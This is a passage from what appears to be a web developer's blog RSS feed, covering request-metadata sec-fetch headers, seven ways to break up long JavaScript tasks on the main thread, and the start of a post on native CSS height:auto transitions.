    headers[&quot;sec-fetch-user&quot;] === &quot;?1&quot;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Technically, any one of those checks would be sufficient. But I like to be thorough. &lt;/p&gt;&lt;h3&gt;A Note About Edge Functions&lt;/h3&gt;&lt;p&gt;In my tinkering, I came across something noteworthy regarding these &lt;code&gt;sec-*&lt;/code&gt; headers and edge functions that may be modifying a request. &lt;strong&gt;Creating a new request context will prevent them from being passed down to origin. &lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Let&apos;s look back at that earlier Cloudflare function. This example creates an entirely new context, meaning all metadata request headers are &lt;em&gt;not&lt;/em&gt; automatically included in the new request. Instead, you need to manually set them. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
  fetch(request) {
    // Creating a *new* request...
    const newRequest = new Request(
      &quot;https://some-new-url.com&quot;,
      {
        ...request,
        headers: {
          ...request.headers,
          &quot;sec-fetch-mode&quot;: request.headers[&quot;sec-fetch-mode&quot;],
          //... and so on
        },
      }
    );

    return fetch(newRequest);
  },
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You&apos;re right to tilt your head at this. Apparently, in this particular runtime, those headers aren&apos;t as &quot;forbidden&quot; as they are elsewhere. Regardless, if you do want to include them automatically, see if you can get away with preserving the same request object. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
  fetch(request) {
    return fetch(&quot;https://some-new-url.com&quot;, request);
  },
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;ll make &apos;em stick. No manual setting required. &lt;/p&gt;&lt;h2&gt;Browser Support is Good, Not Ubiquitous &lt;/h2&gt;&lt;p&gt;The vast majority of users out there are on a browser that&apos;s supported these metadata request headers for some time now. But there may be a few stragglers out there. If that could affect you, it&apos;s fine to fall back to the &lt;code&gt;accept&lt;/code&gt; header approach: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function isUserNavigation(headers) {
  // Verify the header was passed...
  if (&quot;sec-fetch-mode&quot; in headers) {
    return (
      headers[&quot;sec-fetch-dest&quot;] === &quot;document&quot; &amp;amp;&amp;amp;
      headers[&quot;sec-fetch-mode&quot;] === &quot;navigate&quot; &amp;amp;&amp;amp;
      headers[&quot;sec-fetch-site&quot;] === &quot;none&quot; &amp;amp;&amp;amp;
      headers[&quot;sec-fetch-user&quot;] === &quot;?1&quot;
    );
  }

  // If not...
  return headers[&quot;accept&quot;].includes(&quot;text/html&quot;) 
    &amp;amp;&amp;amp; !headers[&quot;accept&quot;].includes(&quot;application/json&quot;);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course, that&apos;ll depend on your minimum level of confidence. If it&apos;s very high, you might now fall back at all. Maybe you&apos;d reject (or reroute) the request altogether. Up to you.&lt;/p&gt;&lt;h2&gt;Don&apos;t Bet Your Life&lt;/h2&gt;&lt;p&gt;It&apos;s worth saying again: the fact that a specification exists doesn&apos;t mean people and the tools they create will respect it. We&apos;ve demonstrated that. Keep this in mind as you leverage &lt;code&gt;sec-*&lt;/code&gt; and other forbidden headers. They provide some nice assurance as you size up an HTTP request, but you shouldn&apos;t bet your life on that assurance. That&apos;d be stupid.&lt;/p&gt;</content:encoded></item><item><title>There are a lot of ways to break up long tasks in JavaScript.</title><link>https://macarthur.me/posts/long-tasks</link><guid isPermaLink="true">https://macarthur.me/posts/long-tasks</guid><pubDate>Mon, 03 Feb 2025 03:11:10 GMT</pubDate><content:encoded>&lt;p&gt;It&apos;s not hard to bork your site&apos;s user experience by letting a long, expensive task hog the main thread. No matter how complex an application becomes, the event loop can still do only &lt;em&gt;one thing&lt;/em&gt; at a time. If any of your code is squatting on it, everything else is on standby, and it usually doesn&apos;t take long for your users to notice. &lt;/p&gt;&lt;p&gt;Here&apos;s a contrived example: we have a button for incrementing a count on the screen, alongside a big ol&apos; loop doing some hard work. It&apos;s just running a synchronous pause, but pretend this is something meaningful that you, for whatever reason, need to perform on the main thread – and in order.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot;&amp;gt;count&amp;lt;/button&amp;gt;
&amp;lt;div&amp;gt;Click count: &amp;lt;span id=&quot;clickCount&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;Loop count: &amp;lt;span id=&quot;loopCount&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
  function waitSync(milliseconds) {
    const start = Date.now();
    while (Date.now() - start &amp;lt; milliseconds) {}
  }

  button.addEventListener(&quot;click&quot;, () =&amp;gt; {
    clickCount.innerText = Number(clickCount.innerText) + 1;
  });

  const items = new Array(100).fill(null);

  for (const i of items) {
    loopCount.innerText = Number(loopCount.innerText) + 1;
    waitSync(50);
  }
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When you run this, nothing visually updates – not even the loop count. That&apos;s because the browser never gets a chance to paint to the screen. This is all you get, no matter how furiously you click. Only when the looping is completely finished do you get any feedback.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/frozen-click.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;453&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The dev tools flame chart corroborates this.  That single task in the event loop takes five seconds to complete. Horrrrrible.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/CleanShot-2025-01-31-at-01.55.04@2x.png&quot; alt=&quot;flame chart showing long, expensive task&quot; loading=&quot;lazy&quot; width=&quot;1890&quot; height=&quot;752&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If you&apos;ve been in a similar situation before, you know that the solution is periodically break that big task up across multiple ticks of the event loop. This gives other parts of the browser a chance to use the main thread for other important things, like handling button clicks and repaints. We want to go from this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/long-task.png&quot; alt=&quot;long task illustration&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;333&quot; /&gt;&lt;/figure&gt;&lt;p&gt;To this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/shorter-tasks.png&quot; alt=&quot;shorter tasks illustration&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;243&quot; /&gt;&lt;/figure&gt;&lt;p&gt;There are actually a shocking number of ways to pull this off. We&apos;re gonna explore some of them, starting with the most classic: recursion.&lt;/p&gt;&lt;h2&gt;#1: &lt;code&gt;setTimeout()&lt;/code&gt; + Recursion &lt;/h2&gt;&lt;p&gt;If you wrote JavaScript before native promises existed, you&apos;ve undoubtedly seen something like this: a function recursively calling itself from the callback of a timeout.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function processItems(items, index) {
  index = index || 0;
  var currentItem = items[index];

  console.log(&quot;processing item:&quot;, currentItem);

  if (index + 1 &amp;lt; items.length) {
    setTimeout(function () {
      processItems(items, index + 1);
    }, 0);
  }
}

processItems([&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&apos;s nothing wrong with it, even today. After all, the objective is accomplished – each item is processed on a different tick, spreading out the work. Look at this 400ms section of the flame chart. Rather than one big task, we get a bunch of smaller ones:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/CleanShot-2025-01-31-at-02.06.48@2x.png&quot; alt=&quot;flame chart using setTimeout and recursion&quot; loading=&quot;lazy&quot; width=&quot;1814&quot; height=&quot;492&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And that leaves the UI nice and responsive. Click handlers can work, and the browser can paint updates to the screen: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/responsive.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;456&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But we&apos;re a decade past ES6 now, and the browser offers several ways to more accomplish the same thing, all of them made a little more ergonomic with promises.&lt;/p&gt;&lt;h2&gt;#2: Async/Await &amp;amp; a Timeout&lt;/h2&gt;&lt;p&gt;This combination allows us to abandon recursion and streamline things a little:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot;&amp;gt;count&amp;lt;/button&amp;gt;
&amp;lt;div&amp;gt;Click count: &amp;lt;span id=&quot;clickCount&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;Loop count: &amp;lt;span id=&quot;loopCount&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
  function waitSync(milliseconds) {
    const start = Date.now();
    while (Date.now() - start &amp;lt; milliseconds) {}
  }

  button.addEventListener(&quot;click&quot;, () =&amp;gt; {
    clickCount.innerText = Number(clickCount.innerText) + 1;
  });

  (async () =&amp;gt; {
    const items = new Array(100).fill(null);

    for (const i of items) {
      loopCount.innerText = Number(loopCount.innerText) + 1;

      await new Promise((resolve) =&amp;gt; setTimeout(resolve, 0));
          
      waitSync(50);
    }
  })();
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Much better. Just a simple &lt;code&gt;for&lt;/code&gt; loop and awaiting a promise to resolve. The rhythm on the event loop is very similar, with one key change, outlined in red:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-01-at-19.57.46@2x.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;391&quot; /&gt;&lt;/figure&gt;&lt;p&gt;A promise&apos;s &lt;code&gt;.then()&lt;/code&gt; method is always&lt;a href=&quot;https://macarthur.me/posts/navigating-the-event-loop/?ref=cms.macarthur.me#the-microtask-queue&quot;&gt; executed on the microtask queue&lt;/a&gt;, after everything else on the call stack is finished. It&apos;s almost always an inconsequential difference, but worth noting nonetheless. &lt;/p&gt;&lt;h2&gt;#3: &lt;code&gt;scheduler.postTask()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;The &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Scheduler?ref=cms.macarthur.me&quot;&gt;Scheduler interface&lt;/a&gt; is relatively new to Chromium browsers, intending to be a first-class tool for scheduling tasks with a lot more control and efficiency. It&apos;s basically a better version of what we&apos;ve been relying on &lt;code&gt;setTimeout()&lt;/code&gt; to do for us for decades.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const items = new Array(100).fill(null);

for (const i of items) {
  loopCount.innerText = Number(loopCount.innerText) + 1;

  await new Promise((resolve) =&amp;gt; scheduler.postTask(resolve));

  waitSync(50);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What&apos;s interesting about running our loop with &lt;code&gt;postTask()&lt;/code&gt; is the amount of time between scheduled tasks. Here&apos;s a snippet of the flame chart over 400ms again. Notice how tightly each new tasks executes after the previous one. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-01-at-19.55.49@2x.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1944&quot; height=&quot;446&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The default priority of &lt;code&gt;postTask()&lt;/code&gt; is &quot;user-visible&quot;, which appears to be comparable to the priority of &lt;code&gt;setTimeout(() =&amp;gt; {}, 0)&lt;/code&gt;. Output always seems to mirror the order they&apos;re run in code:  &lt;/p&gt;&lt;pre&gt;&lt;code&gt;setTimeout(() =&amp;gt; console.log(&quot;setTimeout&quot;));
scheduler.postTask(() =&amp;gt; console.log(&quot;postTask&quot;));

// setTimeout
// postTask&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;scheduler.postTask(() =&amp;gt; console.log(&quot;postTask&quot;));
setTimeout(() =&amp;gt; console.log(&quot;setTimeout&quot;));

// postTask
// setTimeout&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But unlike &lt;code&gt;setTimeout()&lt;/code&gt;, &lt;code&gt;postTask()&lt;/code&gt; was &lt;em&gt;built&lt;/em&gt; for scheduling, and isn&apos;t subject to the same constraints as timeouts are. Everything scheduled by it is also placed &lt;a href=&quot;https://developer.chrome.com/blog/introducing-scheduler-yield-origin-trial?ref=cms.macarthur.me#enter_scheduleryield&quot;&gt;at the &lt;em&gt;front&lt;/em&gt; of the task queue&lt;/a&gt;, preventing other items from budging in front &amp;amp; delaying execution, especially when being queued in such a rapid fashion. &lt;/p&gt;&lt;p&gt;I can&apos;t say for certain, but I think that because &lt;code&gt;postTask()&lt;/code&gt; is a well-oiled machine with one purpose, the flame chart reflects that. That said, it&apos;s possible to &lt;a href=&quot;https://wicg.github.io/scheduling-apis/?ref=cms.macarthur.me#dom-taskpriority-user-blocking&quot;&gt;maximize the priority for tasks&lt;/a&gt; scheduled with &lt;code&gt;postTask()&lt;/code&gt; even further: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;scheduler.postTask(() =&amp;gt; {
  console.log(&quot;postTask&quot;);
}, { priority: &quot;user-blocking&quot; });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &quot;user-blocking&quot; priority is intended for tasks critical to the user&apos;s experience on the page (such as responding to user input). As such, it&apos;s probably not worth using for just breaking up big workloads. After all, we&apos;re trying to politely yield to the event loop so other work can get done. In fact, it may even be worth setting that priority even lower by using &quot;background&quot;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;scheduler.postTask(() =&amp;gt; {
  console.log(&quot;postTask - background&quot;);
}, { priority: &quot;background&quot; });

setTimeout(() =&amp;gt; console.log(&quot;setTimeout&quot;));

scheduler.postTask(() =&amp;gt; console.log(&quot;postTask - default&quot;));

// setTimeout
// postTask - default
// postTask - background&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Unfortunately, the entire Scheduler interface comes with a bummer: &lt;a href=&quot;https://caniuse.com/mdn-api_scheduler?ref=cms.macarthur.me&quot;&gt;it&apos;s not that well-supported&lt;/a&gt; across all browsers yet. But &lt;a href=&quot;https://github.com/GoogleChromeLabs/scheduler-polyfill?ref=cms.macarthur.me&quot;&gt;it is easy enough to polyfill&lt;/a&gt; with existing asynchronous APIs. So, at least a strong portion of users would benefit from it.&lt;/p&gt;&lt;h3&gt;What about &lt;code&gt;requestIdleCallback()&lt;/code&gt;?&lt;/h3&gt;&lt;p&gt;If it&apos;s good to surrender priority like this, &lt;code&gt;requestIdleCallback()&lt;/code&gt; might&apos;ve come to mind. It&apos;s designed to execute its callback whenever there&apos;s an &quot;idle&quot; period. The problem with it is that there&apos;s no technical guarantee when or if it&apos;ll run. You &lt;em&gt;could&lt;/em&gt; set a &lt;code&gt;timeout&lt;/code&gt; when it&apos;s invoked, but even then, you&apos;ll still need to reckon with the fact that &lt;a href=&quot;https://caniuse.com/requestidlecallback?ref=cms.macarthur.me&quot;&gt;Safari still doesn&apos;t support the API at all&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;On top of that, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/requestIdleCallback?ref=cms.macarthur.me&quot;&gt;MDN encourages a timeout&lt;/a&gt; over &lt;code&gt;requestIdleCallback()&lt;/code&gt; for required work, so I&apos;d probably just steer clear of it for this purpose altogether.&lt;/p&gt;&lt;h2&gt;#4: &lt;code&gt;scheduler.yield()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;yield()&lt;/code&gt; method on the Scheduler interface is a smidge more special than the other approaches we&apos;ve covered because it was made for this exact sort of scenario. &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Scheduler/yield?ref=cms.macarthur.me&quot;&gt;From MDN&lt;/a&gt;: &lt;/p&gt;&lt;blockquote&gt;The &lt;code&gt;&lt;strong&gt;yield()&lt;/strong&gt;&lt;/code&gt; method of the &lt;code&gt;Scheduler&lt;/code&gt; interface is used for yielding to the main thread during a task and continuing execution later, with the continuation scheduled as a prioritized task... This allows long-running work to be broken up so the browser stays responsive. &lt;/blockquote&gt;&lt;p&gt;That becomes even more clear when you use it for the first time. There&apos;s no longer a need to return &amp;amp; resolve our own promise. Just wait for the one provided:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const items = new Array(100).fill(null);

for (const i of items) {
  loopCount.innerText = Number(loopCount.innerText) + 1;
  
  await scheduler.yield();
  
  waitSync(50);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It cleans up the flame chart a bit too. Notice how there&apos;s one less item in the stack that needs to be identified. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-01-at-23.16.01@2x.png&quot; alt=&quot;flame chart with one less row&quot; loading=&quot;lazy&quot; width=&quot;1776&quot; height=&quot;326&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The API for this is so nice that you can&apos;t help but start seeing opportunities to use it all over. Consider a checkbox that kicks of an expensive task on &lt;code&gt;change&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;document
  .querySelector(&apos;input[type=&quot;checkbox&quot;]&apos;)
  .addEventListener(&quot;change&quot;, function (e) {
    waitSync(1000);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As it is, clicking the checkbox causes the UI to freeze for a second.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-02-at-16.44.42.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;770&quot; height=&quot;366&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But now, let&apos;s immediately yield control to the browser, giving it a chance to update that UI after the click. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;document
  .querySelector(&apos;input[type=&quot;checkbox&quot;]&apos;)
  .addEventListener(&quot;change&quot;, async function (e) {
+    await scheduler.yield();

    waitSync(1000);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Look at that. Nice &amp;amp; snappy. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-02-at-16.50.39.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;332&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As with the rest of the Scheduler interface, this one lacks solid browser support, but it&apos;s still simple to polyfill:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;globalThis.scheduler = globalThis.scheduler || {};
globalThis.scheduler.yield = 
  globalThis.scheduler.yield || 
  (() =&amp;gt; new Promise((r) =&amp;gt; setTimeout(r, 0)));&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;#5: &lt;code&gt;requestAnimationFrame()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;requestAnimationFrame()&lt;/code&gt; API is designed to schedule work around the browser&apos;s repaint cycle. Because of that, it&apos;s very precise in scheduling callbacks. It&apos;ll always be right before the next paint, which likely explains why this flame chart&apos;s tasks are seated so tightly together. Animation frame callbacks &lt;a href=&quot;https://html.spec.whatwg.org/multipage/imagebitmap-and-animations.html?ref=cms.macarthur.me#list-of-animation-frame-callbacks&quot;&gt;effectively have their own &quot;queue&quot;&lt;/a&gt; that runs at a very particular time in the rendering phase, meaning it&apos;s difficult for other tasks to get in the way to push them to the back of the line. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-02-at-19.31.16@2x.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;417&quot; /&gt;&lt;/figure&gt;&lt;p&gt;However, doing expensive work around repaints also appears to compromise rendering. Look at the frames during that same time period. The yellow/lined sections indicate a &quot;partially-presented frame&quot;:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-02-at-19.32.39@2x.png&quot; alt=&quot;partially-presented frames in the flame chart&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;213&quot; /&gt;&lt;/figure&gt;&lt;p&gt;This didn&apos;t&lt;em&gt; &lt;/em&gt;occur with the other task-breaking tactics. Considering this and the fact that animation frame callbacks &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/requestAnimationFrame?ref=cms.macarthur.me&quot;&gt;usually don&apos;t even execute&lt;/a&gt; unless the tab is active, I&apos;d probably avoid this option too.&lt;/p&gt;&lt;h2&gt;#6: &lt;code&gt;MessageChannel()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;You don&apos;t see this one used a whole lot in this way, but when you do, it&apos;s often chosen as a lighter alternative to an zero-delay timeout. Rather than asking the browser to queue a timer and schedule the callback, instantiate a channel and immediately post a message to it: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;for (const i of items) {
  loopCount.innerText = Number(loopCount.innerText) + 1;

  await new Promise((resolve) =&amp;gt; {
    const channel = new MessageChannel();
    channel.port1.onmessage = resolve();
    channel.port2.postMessage(null);
  });

  waitSync(50);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By the looks of the flame chart, there might be something to say for performance. There&apos;s not much delay between each scheduled task: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/CleanShot-2025-02-02-at-19.46.04@2x.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;410&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The (subjective) drawback to this approach, though, is how complicated it is to wire up. It&apos;s quite obvious this isn&apos;t what it was designed for. &lt;/p&gt;&lt;h2&gt;#7: Web Workers&lt;/h2&gt;&lt;p&gt;We&apos;ve said otherwise, but if you &lt;em&gt;can&lt;/em&gt; get away with performing your work off the main thread, a web worker should undoubtedly be your first choice. You technically don&apos;t even need a separate file to house your worker code: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const items = new Array(100).fill(null);

const workerScript = `
  function waitSync(milliseconds) {
    const start = Date.now();
    while (Date.now() - start &amp;lt; milliseconds) {}
  }

  self.onmessage = function(e) {
    waitSync(50);
    self.postMessage(&apos;Process complete!&apos;);
  }
`;

const blob = new Blob([workerScript], { type: &quot;text/javascipt&quot; });
const worker = new Worker(window.URL.createObjectURL(blob));

for (const i of items) {
  worker.postMessage(items);

  await new Promise((resolve) =&amp;gt; {
    worker.onmessage = function (e) {
      loopCount.innerText = Number(loopCount.innerText) + 1;
      resolve();
    };
  });
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Just look how clear the main thread is when the work for individual items is performed elsewhere. Instead, it&apos;s all pushed down below under the &quot;Worker&quot; section, leaving &lt;a href=&quot;https://www.youtube.com/watch?v=ulwUkaKjgY0&amp;amp;ref=cms.macarthur.me&quot;&gt;so much room for activities&lt;/a&gt;.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/02/image.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;752&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The scenario we&apos;ve been using requires progress to be reflected in the UI, and so we&apos;re still passing individual items to the worker &amp;amp; waiting for a response. But if we could pass that entire list of items to the worker at once, we certainly should. That&apos;d cut overhead even more.&lt;/p&gt;&lt;h2&gt;How Do I Choose? &lt;/h2&gt;&lt;p&gt;The approaches we&apos;ve covered here are not exhaustive, but I think they do a good job at representing the various trade-offs you should consider when breaking up long tasks. Still, depending on the need, I&apos;d probably only reach for a subset of these myself.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;If I can do the work off from the main thread,&lt;/strong&gt; I&apos;d choose a web worker, hands-down. They&apos;re very well supported across browsers, and their entire purpose is to offload work from the main thread. The only downside is their clunky API, but that&apos;s eased by tools like Workerize and &lt;a href=&quot;https://vite.dev/guide/features.html?ref=cms.macarthur.me#import-with-query-suffixes&quot;&gt;Vite&apos;s built-in worker imports&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;If I need a dead-simple way to break up tasks, &lt;/strong&gt;I&apos;d go for &lt;code&gt;scheduler.yield()&lt;/code&gt;. I don&apos;t love how I&apos;d also need to polyfill it for non-Chromium users, but the &lt;a href=&quot;https://gs.statcounter.com/browser-market-share?ref=cms.macarthur.me&quot;&gt;majority of people&lt;/a&gt; would benefit from it, so I&apos;m up for that extra bit of baggage. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;If I need very fine-grained control over how chunked work is prioritized&lt;/strong&gt;, &lt;code&gt;scheduler.postTask()&lt;/code&gt; would be my choice. It&apos;s impressive &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Scheduler/postTask?ref=cms.macarthur.me&quot;&gt;how deep you can go&lt;/a&gt; in tailoring that thing to your needs. Priority control, delays, cancelling tasks, and more are all included in this API, even if, like &lt;code&gt;.yield()&lt;/code&gt;, it needs to be polyfilled for now. &lt;/p&gt;&lt;p&gt;&lt;strong&gt;If browser support and reliability are of the utmost importance&lt;/strong&gt;, I&apos;d just choose &lt;code&gt;setTimeout()&lt;/code&gt;. It&apos;s a legend that&apos;s not going anywhere, even as flashy alternatives hit the scene. &lt;/p&gt;&lt;h2&gt;What&apos;d I Miss?&lt;/h2&gt;&lt;p&gt;I&apos;ll admit I&apos;ve never used a few of these in a real-life application, and so it&apos;s very possible there are some blindspots in what you read here. If you can speak into the topic further, even if it&apos;s insight about one of the specific approaches, you&apos;re more than welcome to do so.&lt;/p&gt;</content:encoded></item><item><title>We&apos;ll soon be able to slide open a `height: auto` box with native CSS.</title><link>https://macarthur.me/posts/modern-box-sliding</link><guid isPermaLink="true">https://macarthur.me/posts/modern-box-sliding</guid><pubDate>Sat, 25 Jan 2025 13:45:15 GMT</pubDate><content:encoded>&lt;p&gt;A couple weeks ago, &lt;a href=&quot;https://macarthur.me/posts/box/?ref=cms.macarthur.me&quot;&gt;I wrote about&lt;/a&gt; using JavaScript and forced reflows to slide open a box with an unknown amount of content (i.e. &quot;height: auto&quot;). It’s satisfying to understand how to pull it off and why it works. But at the same time, we know in our bones that the approach is more cumbersome than it needs to be. It&apos;s a capability that ought to exist natively in CSS, alongside the rest of the animation tooling that&apos;s been baked into the language for years now. &lt;/p&gt;&lt;p&gt;I guess that reality is closer than I thought. In fact, there are &lt;em&gt;two&lt;/em&gt; ways to slide a box from zero to “height: auto” coming to native CSS (and they&apos;re already in Chromium-based browsers!). &lt;/p&gt;&lt;p&gt;We&apos;ll get to that. First, a reminder of what it took to slide such a box centuries ago. You might&apos;ve reached for JavaScript: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
#box {
  height: 0;
  overflow: hidden;
  transition: height 1s;
}
&amp;lt;/style&amp;gt;

&amp;lt;script&amp;gt;
const openButton = document.getElementById(&apos;openButton&apos;);
const box = document.getElementById(&apos;box&apos;);

openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
  // Close the box after forcing a reflow.
  if (box.clientHeight &amp;gt; 0) {
    box.style.height = &apos;0px&apos;;
    return;
  }

  box.style.height = &apos;auto&apos;;
  const targetHeight = box.clientHeight;
  box.style.height = `0px`;

  // Force a reflow to trigger the animation.
  box.offsetHeight;

  box.style.height = `${targetHeight}px`;
});
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&apos;s a lot of not-so-obvious stuff going on there, namely, the forced, synchronous reflows that need to be precisely triggered by accessing a particular DOM property (&lt;code&gt;clientHeight&lt;/code&gt;). Tools like the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API?ref=cms.macarthur.me&quot;&gt;Web Animations API&lt;/a&gt; smooth out the task a little, but even that is surprisingly painful to get simple back-and-forth sliding working in a way that can handle unpredictable user behavior. For a taste of that, see what I had to do with &lt;a href=&quot;https://github.com/alexmacarthur/slide-element/blob/master/src/index.ts?ref=cms.macarthur.me#L67&quot;&gt;slide-element&lt;/a&gt;. Ain&apos;t pretty. &lt;/p&gt;&lt;p&gt;CSS was technically on the table as well. Animating &lt;code&gt;grid-template-rows&lt;/code&gt; in CSS Grid gets you the desired output, but even that  &lt;a href=&quot;https://css-tricks.com/css-grid-can-do-auto-height-transitions/?ref=cms.macarthur.me&quot;&gt;requires more setup&lt;/a&gt; than feels appropriate, and isn&apos;t something I&apos;d consider &quot;intuitive.&quot;&lt;/p&gt;&lt;h2&gt;Sliding w/ &lt;code&gt;calc-size()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;Two upcoming CSS features will ease all that pain. First, look at &lt;code&gt;calc-size()&lt;/code&gt;, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/calc-size?ref=cms.macarthur.me&quot;&gt;a new function&lt;/a&gt; that allows you to do math with &lt;em&gt;intrinsic size keywords&lt;/em&gt; like &lt;code&gt;auto&lt;/code&gt;. The function&apos;s result is animatable (word?) by default, so this is all we need:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
  #box {
    height: 0;
    overflow: hidden;
    transition: height 1s;
  }

  #box.is-open {
    height: calc-size(auto, size);
  }
&amp;lt;/style&amp;gt;

&amp;lt;script&amp;gt;
  const openButton = document.getElementById(&apos;openButton&apos;);
  const box = document.getElementById(&apos;box&apos;);
  
